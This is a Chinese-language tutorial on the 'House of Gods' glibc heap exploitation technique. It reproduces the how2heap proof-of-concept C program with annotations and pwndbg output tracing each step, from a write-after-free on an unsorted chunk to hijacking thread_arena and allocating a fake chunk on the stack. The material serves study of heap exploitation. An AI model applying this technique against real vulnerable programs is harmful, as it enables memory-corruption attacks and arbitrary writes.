## House of Gods

#### 本机制将借用how2heap上面的glibc_2.23/house_of_gods.c来进行讲解

### 机制讲解
* **什么是House of Gods？**
House of Gods是一种在glibc 2.27版本之下，通过构造，拿到binmap作为堆块。并以此为跳板，将main_arena的下一个arena改到用户可以控制的地方，再malloc，便可以实现任意写了

* 想要了解该机制，还得先了解malloc state结构体的成员
```c
struct malloc_state -> 它本身也可以当作一个chunk
{
  /* Serialize access.  */
  mutex_t mutex;
  /* Flags (formerly in max_fast).  */
  int flags;
  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS]; -> 当作chunk时，size和fd bk指针在这里
  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;
  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;
  /* Normal bins packed as described above */
  mchunkptr bins[NBINS * 2 - 2];
  /* Bitmap of bins */
  unsigned int binmap[BINMAPSIZE]; ->这里是我们核心要修改的地方
  /* Linked list */
  struct malloc_state *next; -> 这个指针我们也要变
  /* Linked list for free arenas.  Access to this field is serialized
     by free_list_lock in arena.c.  */
  struct malloc_state *next_free;
  /* Number of threads attached to this arena.  0 if the arena is on
     the free list.  Access to this field is serialized by
     free_list_lock in arena.c.  */
  INTERNAL_SIZE_T attached_threads;
  /* Memory allocated from the system in this arena.  */
  INTERNAL_SIZE_T system_mem; -> 这个要改成一个极大的值
  INTERNAL_SIZE_T max_system_mem;
};
```

* **具体利用过程请见如下源码**
```c
// how2heap/glibc_2.23/house_of_gods.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <inttypes.h>

/* <--- Exploit PoC ---> */

int main(void) {

    printf("=================\n");
    printf("= House of Gods =\n");
    printf("=================\n\n");

    printf("=== Abstract ===\n\n");

    printf("The core of this technique is to allocate a fakechunk overlapping\n");
    printf("the binmap field within the main_arena. This fakechunk is located at\n");
    printf("offset 0x850. Its sizefield can be crafted by carefully binning chunks\n");
    printf("into smallbins or largebins. The binmap-chunk is then being linked into\n");
    printf("the unsorted bin via a write-after-free bug in order to allocate it back\n");
    printf("as an exact fit. One can now tamper with the main_arena.next pointer at\n");
    printf("offset 0x868 and inject the address of a fake arena. A final unsorted bin\n");
    printf("attack corrupts the narenas variable with a very large value. From there, only\n");
    printf("two more allocation requests for at least 0xffffffffffffffc0 bytes of memory\n");
    printf("are needed to trigger two consecutive calls to the reused_arena() function,\n");
    printf("which in turn traverses the corrupted arena-list and sets thread_arena to the\n");
    printf("address stored in main_arena.next - the address of the fake arena.\n\n");

    printf("=== PoC ===\n\n");

    printf("Okay, so let us start by allocating some chunks...\n\n");

    /*
     * allocate a smallchunk, for example a 0x90-chunk.
     * */
    void *SMALLCHUNK = malloc(0x88);  // 先分配一个small chunk，用于泄漏main_arena地址和计算后续偏移

    /*
     * allocate the first fastchunk. We will use
     * a 0x20-chunk for this purpose.
     * */
    void *FAST20 = malloc(0x18);  // 这个堆块指针是为了在后面构造unsorted bin链的时候，其中有一环是把main_arena作为一个chunk，fastbin大小为0x20的指针正好位于size域的位置

    /*
     * allocate a second fastchunk. This time
     * a 0x40-chunk.
     * */
    void *FAST40 = malloc(0x38); // 同上，fastbin大小为0x40的指针正好位于bk指针的位置

    printf("%p is our 0x90-sized smallchunk. We will bin this chunk to forge a\n", SMALLCHUNK);
    printf("fake sizefield for our binmap-chunk.\n\n");

    printf("%p is our first fastchunk. Its size is 0x20.\n\n", FAST20);

    printf("%p is our second fastchunk with a size of 0x40. The usecase of\n", FAST40);
    printf("both fastchunks will be explained later in this PoC.\n\n");

    printf("We can move our smallchunk to the unsorted bin by simply free'ing it...\n\n");

    /*
     * put SMALLCHUNK into the unsorted bin.
     * */
    free(SMALLCHUNK); // 把small chunk释放，成功在fd bk指针处写下unsorted bin头的地址，从而可以计算之后的偏移

    /*
     * this is a great opportunity to simulate a
     * libc leak. We just read the address of the
     * unsorted bin and save it for later.
     * */
    const uint64_t leak = *((uint64_t*) SMALLCHUNK);

    printf("And now we need to make a request for a chunk which can not be serviced by\n");
    printf("our recently free'd smallchunk. Thus, we will make a request for a\n");
    printf("0xa0-sized chunk - let us call this chunk INTM (intermediate).\n\n");

    /*
     * following allocation will trigger a binning
     * process within the unsorted bin and move
     * SMALLCHUNK to the 0x90-smallbin.
     * */
    void *INTM = malloc(0x98); // 分配一个与上面0x88大小不一致的堆块，会导致刚才那个small chunk被放入对应的small bin里面，binmap上面对应的bit会被置为1，导致binmap那个字段由最开始的0变成了0x200

    printf("Our smallchunk should be now in the 0x90-smallbin. This process also triggered\n");
    printf("the mark_bin(m, i) macro within the malloc source code. If you inspect the\n");
    printf("main_arena's binmap located at offset 0x855, you will notice that the initial\n");
    printf("value of the binmap changed from 0x0 to 0x200 - which can be used as a valid\n");
    printf("sizefield to bypass the unsorted bin checks.\n\n");

    printf("We would also need a valid bk pointer in order to bypass the partial unlinking\n");
    printf("procedure within the unsorted bin. But luckily, the main_arena.next pointer at\n");
    printf("offset 0x868 points initially to the start of the main_arena itself. This fact\n");
    printf("makes it possible to pass the partial unlinking without segfaulting.\n\n");

    printf("So now that we have crafted our binmap-chunk, it is time to allocate it\n");
    printf("from the unsorted bin. For that, we will abuse a write-after-free bug\n");
    printf("on an unsorted chunk. Let us start...\n\n");

    printf("First, allocate another smallchunk...\n");

    /*
     * recycle our previously binned smallchunk.
     * Note that, it is not neccessary to recycle this
     * chunk. I am doing it only to keep the heap layout
     * small and compact.
     * */
    SMALLCHUNK = malloc(0x88); // 再将small bin重复利用，再放回一遍unsorted bin

    printf("...and now move our new chunk to the unsorted bin...\n");

    /*
     * put SMALLCHUNK into the unsorted bin.
     * */
    free(SMALLCHUNK);

    printf("...in order to tamper with the free'd chunk's bk pointer.\n\n");

    /*
     * bug: a single write-after-free bug on an
     * unsorted chunk is enough to initiate the
     * House of Gods technique.
     * */
    *((uint64_t*) (SMALLCHUNK + 0x8)) = leak + 0x7f8; // 把smallchunk的bk指针改成binmap所在chunk的header的地址，这样binmap里面刚才设置的0x200就会被当作一个chunk的size。此时malloc state里面的next指针位置会被当作这个假chunk的bk指针，他初始是指向main arena的state自己的。

    printf("Great. We have redirected the unsorted bin to our binmap-chunk.\n");
    printf("But we also have corrupted the bin. Let's fix this, by redirecting\n");
    printf("a second time.\n\n");

    printf("The next chunk (head->bk->bk->bk) in the unsorted bin is located at the start\n");
    printf("of the main-arena. We will abuse this fact and free a 0x20-chunk and a 0x40-chunk\n");
    printf("in order to forge a valid sizefield and bk pointer. We will also let the 0x40-chunk\n");
    printf("point to another allocated chunk (INTM) by writing to its bk pointer before\n");
    printf("actually free'ing it.\n\n");

    /*
     * before free'ing those chunks, let us write
     * the address of another chunk to the currently
     * unused bk pointer of FAST40. We can reuse
     * the previously requested INTM chunk for that.
     *
     * Free'ing FAST40 wont reset the bk pointer, thus
     * we can let it point to an allocated chunk while
     * having it stored in one of the fastbins.
     *
     * The reason behind this, is the simple fact that
     * we will need to perform an unsorted bin attack later.
     * And we can not request a 0x40-chunk to trigger the
     * partial unlinking, since a 0x40 request will be serviced
     * from the fastbins instead of the unsorted bin.
     * */
    *((uint64_t*) (FAST40 + 0x8)) = (uint64_t) (INTM - 0x10); // 上面一套操作下来，unsorted bin的head的bk指向small chunk，small chunk的bk指向binmap对应的chunk，binmap对应的chunk的bk指向main arena。这里在释放FAST40之前，先把他的bk改成刚才我们分配过的一个堆块INTM的地址。这样方便我们最后让unsorted bin的链通过bk指针链接成：head->small chunk->binmap->main arena->FAST40->INTM

    /*
     * and now free the 0x20-chunk in order to forge a sizefield.
     * */
    free(FAST20); // 相当于把main arena这个“chunk”的size放进去了

    /*
     * and the 0x40-chunk in order to forge a bk pointer.
     * */
    free(FAST40); // 相当于把main arena这个“chunk”的bk指针放进去了

    printf("Okay. The unsorted bin should now look like this\n\n");

    printf("head -> SMALLCHUNK -> binmap -> main-arena -> FAST40 -> INTM\n");
    printf("     bk            bk        bk            bk        bk\n\n");

    printf("The binmap attack is nearly done. The only thing left to do, is\n");
    printf("to make a request for a size that matches the binmap-chunk's sizefield.\n\n");

    /*
     * all the hard work finally pays off...we can
     * now allocate the binmap-chunk from the unsorted bin.
     * */
    void *BINMAP = malloc(0x1f8); // 分配一个0x200大小的chunk，从head开始往后走，发现直到binmap正好符合。现在small chunk又回small bin里面了。binmap对应的那个chunk则被拿到了。剩下的unsorted bin是：head->main_arena->FAST40->INTM

    printf("After allocating the binmap-chunk, the unsorted bin should look similar to this\n\n");

    printf("head -> main-arena -> FAST40 -> INTM\n");
    printf("     bk            bk        bk\n\n");

    printf("And that is a binmap attack. We've successfully gained control over a small\n");
    printf("number of fields within the main-arena. Two of them are crucial for\n");
    printf("the House of Gods technique\n\n");

    printf("    -> main_arena.next\n");
    printf("    -> main_arena.system_mem\n\n");

    printf("By tampering with the main_arena.next field, we can manipulate the arena's\n");
    printf("linked list and insert the address of a fake arena. Once this is done,\n");
    printf("we can trigger two calls to malloc's reused_arena() function.\n\n");

    printf("The purpose of the reused_arena() function is to return a non-corrupted,\n");
    printf("non-locked arena from the arena linked list in case that the current\n");
    printf("arena could not handle previous allocation request.\n\n");

    printf("The first call to reused_arena() will traverse the linked list and return\n");
    printf("a pointer to the current main-arena.\n\n");

    printf("The second call to reused_arena() will traverse the linked list and return\n");
    printf("a pointer to the previously injected fake arena (main_arena.next).\n\n");

    printf("We can reach the reused_arena() if we meet following conditions\n\n");

    printf("    - exceeding the total amount of arenas a process can have.\n");
    printf("      malloc keeps track by using the narenas variable as\n");
    printf("      an arena counter. If this counter exceeds the limit (narenas_limit),\n");
    printf("      it will start to reuse existing arenas from the arena list instead\n");
    printf("      of creating new ones. Luckily, we can set narenas to a very large\n");
    printf("      value by performing an unsorted bin attack against it.\n\n");

    printf("    - force the malloc algorithm to ditch the current arena.\n");
    printf("      When malloc notices a failure it will start a second allocation\n");
    printf("      attempt with a different arena. We can mimic an allocation failure by\n");
    printf("      simply requesting too much memory i.e. 0xffffffffffffffc0 and greater.\n\n");

    printf("Let us start with the unsorted bin attack. We load the address of narenas\n");
    printf("minus 0x10 into the bk pointer of the currently allocated INTM chunk...\n\n");

    /*
     * set INTM's bk to narenas-0x10. This will
     * be our target for the unsorted bin attack.
     * */
    *((uint64_t*) (INTM + 0x8)) = leak - 0xa40; // 把INTM的bk指针换成narenas-0x10的地址，方便之后使用unsorted bin attack，bck->fd=av使得narenas的值被改成unsorted bin的头指针的值，这将会是一个极大的值，导致系统不会再开辟新的arena。这就意味着如果malloc出错，系统会在已有的arena里面寻找机会，这就给了我们机会。

    printf("...and then manipulate the main_arena.system_mem field in order to pass the\n");
    printf("size sanity checks for the chunk overlapping the main-arena.\n\n");

    /*
     * this way we can abuse a heap pointer
     * as a valid sizefield.
     * */
    *((uint64_t*) (BINMAP + 0x20)) = 0xffffffffffffffff; // BINMAP+0x20是malloc state里面system_mem的地址，把这个值改成这个最大的无符号数，就是让所有分配堆块时的大小合法性检查都通过

    printf("The unsorted bin should now look like this\n\n");

    printf("head -> main-arena -> FAST40 -> INTM -> narenas-0x10\n");
    printf("     bk            bk        bk      bk\n\n");

    printf("We can now trigger the unsorted bin attack by requesting the\n");
    printf("INTM chunk as an exact fit.\n\n");

    /*
     * request the INTM chunk from the unsorted bin
     * in order to trigger a partial unlinking between
     * head and narenas-0x10.
     * */
    INTM = malloc(0x98); // unsorted bin直接走到什么块都不剩了，或者说最后head的bk指向的是narenas-0x10的位置。而narenas已经被覆写成那个头指针极大值了，unsorted bin attack成功了。

    printf("Perfect. narenas is now set to the address of the unsorted bin's head\n");
    printf("which should be large enough to exceed the existing arena limit.\n\n");

    printf("Let's proceed with the manipulation of the main_arena.next pointer\n");
    printf("within our previously allocated binmap-chunk. The address we write\n");
    printf("to this field will become the future value of thread_arena.\n\n");

    /*
     * set main_arena.next to an arbitrary address. The
     * next two calls to malloc will overwrite thread_arena
     * with the same address. I'll reuse INTM as fake arena.
     *
     * Note, that INTM is not suitable as fake arena but
     * nevertheless, it is an easy way to demonstrate that
     * we are able to set thread_arena to an arbitrary address.
     * */
    *((uint64_t*) (BINMAP + 0x8)) = (uint64_t) (INTM - 0x10); // BINMAP这个chunk的bk指针对应的是malloc state的next指针，现在被改成我们伪造的arena位置了，也就是INTM所属chunk的位置。

    printf("Done. Now all what's left to do is to trigger two calls to the reused_arena()\n");
    printf("function by making two requests for an invalid chunksize.\n\n");

    /*
     * the first call will force the reused_arena()
     * function to set thread_arena to the address of
     * the current main-arena.
     * */
    malloc(0xffffffffffffffbf + 1);

    /*
     * the second call will force the reused_arena()
     * function to set thread_arena to the address stored
     * in main_arena.next - our fake arena.
     * */
    malloc(0xffffffffffffffbf + 1); // 我们这里所做的两次错误的过大的malloc，虽然能过system_mem检查，但是没那么多空间去分配，所以系统会通过reuse_arena来重试。第一次换的时候还是重试当前的main arena，第二次失败则会换到next指针指向的arena，即INTM所在chunk位置。成功将arena控制到我们伪造的地方！

    printf("We did it. We hijacked the thread_arena symbol and from now on memory\n");
    printf("requests will be serviced by our fake arena. Let's check this out\n");
    printf("by allocating a fakechunk on the stack from one of the fastbins\n");
    printf("of our new fake arena.\n\n");

    /*
     * construct a 0x70-fakechunk on the stack...
     * */
    uint64_t fakechunk[4] = {

        0x0000000000000000, 0x0000000000000073,
        0x4141414141414141, 0x0000000000000000
    }; // 我们伪造一个大小为0x70的chunk

    /*
     * ...and place it in the 0x70-fastbin of our fake arena
     * */
    *((uint64_t*) (INTM + 0x20)) = (uint64_t) (fakechunk); // 在我们伪造的arena的FASTBIN[5]，也就是大小为0x70的fastbin位置，放入这个伪造好的chunk。

    printf("Fakechunk in position at stack address %p\n", fakechunk);
    printf("Target data within the fakechunk at address %p\n", &fakechunk[2]);
    printf("Its current value is %#lx\n\n", fakechunk[2]);

    printf("And after requesting a 0x70-chunk...\n");

    /*
     * use the fake arena to perform arbitrary allocations
     * */
    void *FAKECHUNK = malloc(0x68); // 这样我们malloc一个0x70的chunk，拿到的就是我们这个假的arena里面对应大小fastbin里面的假chunk了

    printf("...malloc returns us the fakechunk at %p\n\n", FAKECHUNK);

    printf("Overwriting the newly allocated chunk changes the target\n");
    printf("data as well: ");

    /*
     * overwriting the target data
     * */
    *((uint64_t*) (FAKECHUNK)) = 0x4242424242424242; 

    printf("%#lx\n", fakechunk[2]);

    /*
     * confirm success
     * */
    assert(fakechunk[2] == 0x4242424242424242); // 可以看到我们已经成功拿到这个假chunk了，说明我们的arena成功切换到假arena了，House of Gods利用成功！

    return EXIT_SUCCESS;
}

```

### gdb调试验证
1. 第一次放入0x88的块，看看他的fd指针指向的地方
```bash
pwndbg> b 112
Breakpoint 2 at 0x5555555553ba: file glibc_2.23/house_of_gods.c, line 112.
pwndbg> c
Continuing.
=================
= House of Gods =
=================

=== Abstract ===

The core of this technique is to allocate a fakechunk overlapping
the binmap field within the main_arena. This fakechunk is located at
offset 0x850. Its sizefield can be crafted by carefully binning chunks
into smallbins or largebins. The binmap-chunk is then being linked into
the unsorted bin via a write-after-free bug in order to allocate it back
as an exact fit. One can now tamper with the main_arena.next pointer at
offset 0x868 and inject the address of a fake arena. A final unsorted bin
attack corrupts the narenas variable with a very large value. From there, only
two more allocation requests for at least 0xffffffffffffffc0 bytes of memory
are needed to trigger two consecutive calls to the reused_arena() function,
which in turn traverses the corrupted arena-list and sets thread_arena to the
address stored in main_arena.next - the address of the fake arena.

=== PoC ===

Okay, so let us start by allocating some chunks...

0x55555555a420 is our 0x90-sized smallchunk. We will bin this chunk to forge a
fake sizefield for our binmap-chunk.

0x55555555a4b0 is our first fastchunk. Its size is 0x20.

0x55555555a4d0 is our second fastchunk with a size of 0x40. The usecase of
both fastchunks will be explained later in this PoC.

We can move our smallchunk to the unsorted bin by simply free'ing it...

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555a000
Size: 0x410 (with flag bits: 0x411)

Allocated chunk | PREV_INUSE smallchunk
Addr: 0x55555555a410
Size: 0x90 (with flag bits: 0x91)

Allocated chunk | PREV_INUSE FAST20
Addr: 0x55555555a4a0
Size: 0x20 (with flag bits: 0x21)

Allocated chunk | PREV_INUSE FAST40
Addr: 0x55555555a4c0
Size: 0x40 (with flag bits: 0x41)

Top chunk | PREV_INUSE
Addr: 0x55555555a500
Size: 0x20b00 (with flag bits: 0x20b01)

......

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555a000
Size: 0x410 (with flag bits: 0x411)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555a410
Size: 0x90 (with flag bits: 0x91)
fd: 0x7ffff7bc4b78 unsortedbin head
bk: 0x7ffff7bc4b78

Allocated chunk
Addr: 0x55555555a4a0
Size: 0x20 (with flag bits: 0x20)

Allocated chunk | PREV_INUSE
Addr: 0x55555555a4c0
Size: 0x40 (with flag bits: 0x41)

Top chunk | PREV_INUSE
Addr: 0x55555555a500
Size: 0x20b00 (with flag bits: 0x20b01)
```
2. 更改bitmap，使其成为size 0x200
```bash
pwndbg> x/gx 0x7ffff7bc4b78+0x800
0x7ffff7bc5378 <main_arena+2136>:	0x0000000000000000
pwndbg> b 131
Breakpoint 3 at 0x55555555540c: file glibc_2.23/house_of_gods.c, line 132.
pwndbg> c
Continuing.
And now we need to make a request for a chunk which can not be serviced by
our recently free'd smallchunk. Thus, we will make a request for a
0xa0-sized chunk - let us call this chunk INTM (intermediate).

pwndbg> x/gx 0x7ffff7bc4b78+0x800
0x7ffff7bc5378 <main_arena+2136>:	0x0000000000000200
```
3. 构造unsorted bin链，直到INTM
```bash
pwndbg> b 210
Breakpoint 4 at 0x5555555555c0: file glibc_2.23/house_of_gods.c, line 211.
pwndbg> c
Continuing.
Our smallchunk should be now in the 0x90-smallbin. This process also triggered
the mark_bin(m, i) macro within the malloc source code. If you inspect the
main_arena's binmap located at offset 0x855, you will notice that the initial
value of the binmap changed from 0x0 to 0x200 - which can be used as a valid
sizefield to bypass the unsorted bin checks.

We would also need a valid bk pointer in order to bypass the partial unlinking
procedure within the unsorted bin. But luckily, the main_arena.next pointer at
offset 0x868 points initially to the start of the main_arena itself. This fact
makes it possible to pass the partial unlinking without segfaulting.

So now that we have crafted our binmap-chunk, it is time to allocate it
from the unsorted bin. For that, we will abuse a write-after-free bug
on an unsorted chunk. Let us start...

First, allocate another smallchunk...
...and now move our new chunk to the unsorted bin...
...in order to tamper with the free'd chunk's bk pointer.

Great. We have redirected the unsorted bin to our binmap-chunk.
But we also have corrupted the bin. Let's fix this, by redirecting
a second time.

The next chunk (head->bk->bk->bk) in the unsorted bin is located at the start
of the main-arena. We will abuse this fact and free a 0x20-chunk and a 0x40-chunk
in order to forge a valid sizefield and bk pointer. We will also let the 0x40-chunk
point to another allocated chunk (INTM) by writing to its bk pointer before
actually free'ing it.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555a000
Size: 0x410 (with flag bits: 0x411)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555a410
Size: 0x90 (with flag bits: 0x91)
fd: 0x7ffff7bc4b78
bk: 0x7ffff7bc5370

Free chunk (fastbins)
Addr: 0x55555555a4a0
Size: 0x20 (with flag bits: 0x20)
fd: 0x00

Free chunk (fastbins) | PREV_INUSE
Addr: 0x55555555a4c0
Size: 0x40 (with flag bits: 0x41)
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x55555555a500
Size: 0xa0 (with flag bits: 0xa1)

Top chunk | PREV_INUSE
Addr: 0x55555555a5a0
Size: 0x20a60 (with flag bits: 0x20a61)

pwndbg> unsortedbin
unsortedbin
all [corrupted]
FD: 0x55555555a410 —▸ 0x7ffff7bc4b78 (main_arena+88) ◂— 0x55555555a410
BK: 0x55555555a410 —▸ 0x7ffff7bc5370 (main_arena+2128) —▸ 0x7ffff7bc4b20 (main_arena) —▸ 0x55555555a4c0 —▸ 0x55555555a500 ◂— ... 就是head->binmap->main arena->FAST40->INTM
```
4. 拿到binmap所在chunk，更改narenas、system_mem
```bash
pwndbg> b 314
Breakpoint 5 at 0x5555555558d1: file glibc_2.23/house_of_gods.c, line 314.
pwndbg> c
Continuing.
Okay. The unsorted bin should now look like this

head -> SMALLCHUNK -> binmap -> main-arena -> FAST40 -> INTM
     bk            bk        bk            bk        bk

The binmap attack is nearly done. The only thing left to do, is
to make a request for a size that matches the binmap-chunk's sizefield.

After allocating the binmap-chunk, the unsorted bin should look similar to this

head -> main-arena -> FAST40 -> INTM
     bk            bk        bk

And that is a binmap attack. We've successfully gained control over a small
number of fields within the main-arena. Two of them are crucial for
the House of Gods technique

    -> main_arena.next
    -> main_arena.system_mem

By tampering with the main_arena.next field, we can manipulate the arena's
linked list and insert the address of a fake arena. Once this is done,
we can trigger two calls to malloc's reused_arena() function.

The purpose of the reused_arena() function is to return a non-corrupted,
non-locked arena from the arena linked list in case that the current
arena could not handle previous allocation request.

The first call to reused_arena() will traverse the linked list and return
a pointer to the current main-arena.

The second call to reused_arena() will traverse the linked list and return
a pointer to the previously injected fake arena (main_arena.next).

We can reach the reused_arena() if we meet following conditions

    - exceeding the total amount of arenas a process can have.
      malloc keeps track by using the narenas variable as
      an arena counter. If this counter exceeds the limit (narenas_limit),
      it will start to reuse existing arenas from the arena list instead
      of creating new ones. Luckily, we can set narenas to a very large
      value by performing an unsorted bin attack against it.

    - force the malloc algorithm to ditch the current arena.
      When malloc notices a failure it will start a second allocation
      attempt with a different arena. We can mimic an allocation failure by
      simply requesting too much memory i.e. 0xffffffffffffffc0 and greater.

Let us start with the unsorted bin attack. We load the address of narenas
minus 0x10 into the bk pointer of the currently allocated INTM chunk...

...and then manipulate the main_arena.system_mem field in order to pass the
size sanity checks for the chunk overlapping the main-arena.

The unsorted bin should now look like this

head -> main-arena -> FAST40 -> INTM -> narenas-0x10
     bk            bk        bk      bk

We can now trigger the unsorted bin attack by requesting the
INTM chunk as an exact fit.

Perfect. narenas is now set to the address of the unsorted bin's head
which should be large enough to exceed the existing arena limit.

Let's proceed with the manipulation of the main_arena.next pointer
within our previously allocated binmap-chunk. The address we write
to this field will become the future value of thread_arena.

pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555a000
Size: 0x410 (with flag bits: 0x411)

Free chunk (smallbins) | Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555a410
Size: 0x90 (with flag bits: 0x91)
fd: 0x7ffff7bc4bf8
bk: 0x7ffff7bc4bf8

Free chunk (fastbins)
Addr: 0x55555555a4a0
Size: 0x20 (with flag bits: 0x20)
fd: 0x00

Free chunk (smallbins) | PREV_INUSE
Addr: 0x55555555a4c0
Size: 0x40 (with flag bits: 0x41)
fd: 0x7ffff7bc4ba8
bk: 0x7ffff7bc4ba8

Allocated chunk | PREV_INUSE
Addr: 0x55555555a500
Size: 0xa0 (with flag bits: 0xa1)

Top chunk | PREV_INUSE
Addr: 0x55555555a5a0
Size: 0x20a60 (with flag bits: 0x20a61)

pwndbg> x/4gx 0x55555555a500
0x55555555a500:	0x0000000000000000	0x00000000000000a1
0x55555555a510:	0x00007ffff7bc4b78	0x00007ffff7bc4138 
pwndbg> p 0x7ffff7bc4b78-0xa40
$1 = 140737349697848
pwndbg> p/x 0x7ffff7bc4b78-0xa40
$2 = 0x7ffff7bc4138
pwndbg> x/gx 0x7ffff7bc4b78+0x7f8+0x10+0x20
0x7ffff7bc53a0 <main_arena+2176>:	0xffffffffffffffff 成功改掉system_mem
pwndbg> x/4gx 0x00007ffff7bc4138
0x7ffff7bc4138:	0x0000000000000000	0x00000001ffffffff
0x7ffff7bc4148 <narenas>:	0x00007ffff7bc4b78	0x0000000000000003 成功改掉narenas
```
5. 利用错误的malloc，通过reuse_arena，把arena指针改成INTM
```bash
pwndbg> b 325
Breakpoint 6 at 0x55555555590e: file glibc_2.23/house_of_gods.c, line 331.
pwndbg> c
Continuing.
Done. Now all what's left to do is to trigger two calls to the reused_arena()
function by making two requests for an invalid chunksize.

pwndbg> x/gx 0x7ffff7bc4b78+0x7f8+0x10+0x8
0x7ffff7bc5388 <main_arena+2152>:	0x000055555555a500 可以看见next指针已经被改为INTM地址了
```
6. 在栈上构建假chunk，把它放入假arena的对应fastbin里面，接下来malloc(0x68),看看能不能分配到这个假chunk
```bash
pwndbg> b 362
Breakpoint 7 at 0x5555555559fd: file glibc_2.23/house_of_gods.c, line 363.
pwndbg> c
Continuing.
We did it. We hijacked the thread_arena symbol and from now on memory
requests will be serviced by our fake arena. Let's check this out
by allocating a fakechunk on the stack from one of the fastbins
of our new fake arena.

Fakechunk in position at stack address 0x7fffffffde60
Target data within the fakechunk at address 0x7fffffffde70
Its current value is 0x4141414141414141

And after requesting a 0x70-chunk...

───────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffde20 ◂— 1
01:0008│-068 0x7fffffffde28 {SMALLCHUNK} —▸ 0x55555555a420 —▸ 0x7ffff7bc4bf8 (main_arena+216) —▸ 0x7ffff7bc4be8 (main_arena+200) —▸ 0x7ffff7bc4bd8 (main_arena+184) ◂— ...
02:0010│-060 0x7fffffffde30 {FAST20} —▸ 0x55555555a4b0 ◂— 0
03:0018│-058 0x7fffffffde38 {FAST40} —▸ 0x55555555a4d0 —▸ 0x7ffff7bc4ba8 (main_arena+136) —▸ 0x7ffff7bc4b98 (main_arena+120) —▸ 0x7ffff7bc4b88 (main_arena+104) ◂— ...
04:0020│-050 0x7fffffffde40 {leak} —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x55555555a5a0 ◂— 0
05:0028│-048 0x7fffffffde48 {INTM} —▸ 0x55555555a510 —▸ 0x7ffff7bc4b78 (main_arena+88) —▸ 0x55555555a5a0 ◂— 0
06:0030│-040 0x7fffffffde50 {BINMAP} —▸ 0x7ffff7bc5380 (main_arena+2144) ◂— 0x40007ffff7bc4b78
07:0038│-038 0x7fffffffde58 {FAKECHUNK} —▸ 0x7fffffffde70 {fakechunk+0x10} ◂— 'AAAAAAAA' 可以发现FAKECHUNK被分配到了那个栈上的假chunk，这就说明假的arena起作用了
```


* **House of Gods主要利用的就是malloc arena的偏移，通过构造binmap附近为chunk，来修改arena到用户自己构建的假arena上面，之后分配块和释放都会进到这个假块的各个bins里面去**

* **只适用于<=glibc-2.26版本**